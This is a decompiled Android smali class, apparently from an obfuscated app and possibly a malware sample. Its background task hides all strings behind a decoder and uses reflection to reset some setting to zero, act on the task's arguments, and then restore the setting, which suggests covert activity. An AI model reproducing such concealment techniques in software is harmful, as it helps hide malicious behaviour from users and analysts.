.class Lwcu/onmsrbt/zrlyuhm/d;
.super Landroid/os/AsyncTask;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/Object;",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# instance fields
.field final synthetic a:Lwcu/onmsrbt/zrlyuhm/c;


# direct methods
.method constructor <init>(Lwcu/onmsrbt/zrlyuhm/c;)V
    .locals 0

    .prologue
    .line 142
    iput-object p1, p0, Lwcu/onmsrbt/zrlyuhm/d;->a:Lwcu/onmsrbt/zrlyuhm/c;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method protected varargs a([Ljava/lang/Object;)Ljava/lang/Void;
    .locals 10

    .prologue
    .line 146
    const/4 v0, 0x0

    .line 150
    const/16 v1, 0x159

    :try_start_0
    invoke-static {v1}, Lwcu/onmsrbt/zrlyuhm/f;->a(I)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lwcu/onmsrbt/zrlyuhm/a;->b(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    .line 152
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    const/16 v3, 0xed

    invoke-static {v3}, Lwcu/onmsrbt/zrlyuhm/f;->a(I)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    new-array v4, v4, [Ljava/lang/Class;

    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    .line 153
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v3

    const/16 v4, 0xee

    invoke-static {v4}, Lwcu/onmsrbt/zrlyuhm/f;->a(I)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Class;

    const/4 v6, 0x0

    sget-object v7, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v7, v5, v6

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    .line 155
    const/4 v4, 0x1

    invoke-virtual {v2, v4}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 156
    const/4 v4, 0x1

    invoke-virtual {v3, v4}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 158
    const/4 v4, 0x0

    new-array v4, v4, [Ljava/lang/Object;

    invoke-virtual {v2, v1, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    .line 160
    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v6

    aput-object v6, v4, v5

    invoke-virtual {v3, v1, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 163
    :try_start_1
    sget-object v4, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v6, 0x2

    invoke-virtual {v4, v6, v7}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 166
    :goto_0
    const/16 v4, 0x123

    :try_start_2
    invoke-static {v4}, Lwcu/onmsrbt/zrlyuhm/f;->a(I)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v4

    .line 167
    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v5

    const/16 v6, 0x89

    invoke-static {v6}, Lwcu/onmsrbt/zrlyuhm/f;->a(I)Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x2

    new-array v7, v7, [Ljava/lang/Class;

    const/4 v8, 0x0

    const/16 v9, 0x119

    invoke-static {v9}, Lwcu/onmsrbt/zrlyuhm/f;->a(I)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v9

    aput-object v9, v7, v8

    const/4 v8, 0x1

    const/16 v9, 0x11b

    invoke-static {v9}, Lwcu/onmsrbt/zrlyuhm/f;->a(I)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v9

    aput-object v9, v7, v8

    invoke-virtual {v5, v6, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    .line 169
    const/4 v6, 0x1

    invoke-virtual {v5, v6}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 171
    const/4 v6, 0x2

    new-array v6, v6, [Ljava/lang/Object;

    const/4 v7, 0x0

    const/16 v8, 0x30

    invoke-static {v8}, Lwcu/onmsrbt/zrlyuhm/f;->a(I)Ljava/lang/String;

    move-result-object v8

    aput-object v8, v6, v7

    const/4 v7, 0x1

    const/4 v8, 0x0

    aget-object v8, p1, v8

    aput-object v8, v6, v7

    invoke-virtual {v5, v4, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 172
    const/4 v6, 0x2

    new-array v6, v6, [Ljava/lang/Object;

    const/4 v7, 0x0

    const/16 v8, 0x2f

    invoke-static {v8}, Lwcu/onmsrbt/zrlyuhm/f;->a(I)Ljava/lang/String;

    move-result-object v8

    aput-object v8, v6, v7

    const/4 v7, 0x1

    const/4 v8, 0x1

    aget-object v8, p1, v8

    aput-object v8, v6, v7

    invoke-virtual {v5, v4, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 173
    const/4 v6, 0x2

    new-array v6, v6, [Ljava/lang/Object;

    const/4 v7, 0x0

    const/16 v8, 0x31

    invoke-static {v8}, Lwcu/onmsrbt/zrlyuhm/f;->a(I)Ljava/lang/String;

    move-result-object v8

    aput-object v8, v6, v7

    const/4 v7, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    aput-object v0, v6, v7

    invoke-virtual {v5, v4, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 175
    invoke-static {}, Lwcu/onmsrbt/zrlyuhm/g;->a()Lwcu/onmsrbt/zrlyuhm/g;

    move-result-object v0

    const/4 v5, 0x2

    invoke-virtual {v0, v5, v4}, Lwcu/onmsrbt/zrlyuhm/g;->a(ILjava/lang/Object;)V

    .line 177
    invoke-static {}, Lwcu/onmsrbt/zrlyuhm/a;->c()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 178
    const/16 v0, 0x2d

    invoke-static {v0}, Lwcu/onmsrbt/zrlyuhm/f;->a(I)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lwcu/onmsrbt/zrlyuhm/a;->c(Ljava/lang/String;)V

    .line 179
    const/16 v0, 0x164

    invoke-static {v0}, Lwcu/onmsrbt/zrlyuhm/f;->a(I)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lwcu/onmsrbt/zrlyuhm/a;->c(Ljava/lang/String;)V

    .line 182
    :cond_0
    const/4 v0, 0x1

    new-array v0, v0, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v2, v0, v4

    invoke-virtual {v3, v1, v0}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 188
    :goto_1
    const/4 v0, 0x0

    return-object v0

    .line 184
    :catch_0
    move-exception v0

    .line 185
    invoke-static {v0}, Lwcu/onmsrbt/zrlyuhm/a;->a(Ljava/lang/Throwable;)V

    goto :goto_1

    .line 164
    :catch_1
    move-exception v4

    goto/16 :goto_0
.end method

.method protected synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 142
    invoke-virtual {p0, p1}, Lwcu/onmsrbt/zrlyuhm/d;->a([Ljava/lang/Object;)Ljava/lang/Void;

    move-result-object v0

    return-object v0
.end method
